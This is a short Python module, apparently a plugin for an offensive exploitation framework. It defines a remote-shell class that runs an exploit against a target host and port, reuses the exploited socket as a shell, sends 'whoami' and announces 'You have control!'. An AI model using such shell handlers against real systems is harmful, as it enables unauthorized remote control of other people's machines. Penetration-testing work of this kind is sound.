import typing

from pytoolcore import style
from core import shellcore


class BasicReuseShell(shellcore.AsynchronousBasicRemoteShell):

    AUTHOR: str = "Danakane"

    def __init__(self) -> None:
        shellcore.AsynchronousBasicRemoteShell.__init__(self)
        self.customize({
            "rhost": "The vulnerable remote host",
            "rport": "The remote host port to target"
        })

    def initialize(self) -> None:
        self.shellskt = self.exploit.run()
        self.__send__("whoami")
        self.__recv__(shellcore.AsynchronousBasicRemoteShell.PDUMAXSIZE)
        print(style.Style.success("You have control! :)\n"))


blueprint: typing.Callable = BasicReuseShell
